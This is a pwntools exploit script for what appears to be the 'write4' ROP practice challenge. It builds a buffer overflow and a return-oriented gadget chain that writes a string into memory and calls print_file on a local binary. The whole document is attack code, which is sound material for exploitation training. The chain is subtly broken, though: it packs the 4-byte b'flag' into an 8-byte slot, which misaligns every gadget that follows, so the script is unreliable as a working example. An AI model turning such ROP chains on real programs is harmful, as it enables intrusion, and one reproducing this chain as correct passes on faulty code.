from pwn import *
context.log_level='debug'

io = process('./write4')
elf = ELF('./write4')
useful_gadget = 0x400628
r14r15 = 0x400690
rdi = 0x400693
write_addr = 0x601028
main_addr = 0x400607

payload = cyclic(32 + 8)
payload += p64(r14r15) + p64(write_addr) + b'flag'
payload += p64(useful_gadget)
payload += p64(r14r15) + p64(write_addr + 8) + p64(0)
payload += p64(useful_gadget)
payload += p64(rdi) + p64(write_addr)
payload += p64(elf.plt['print_file'])

io.sendlineafter(b'> ', payload)

io.interactive()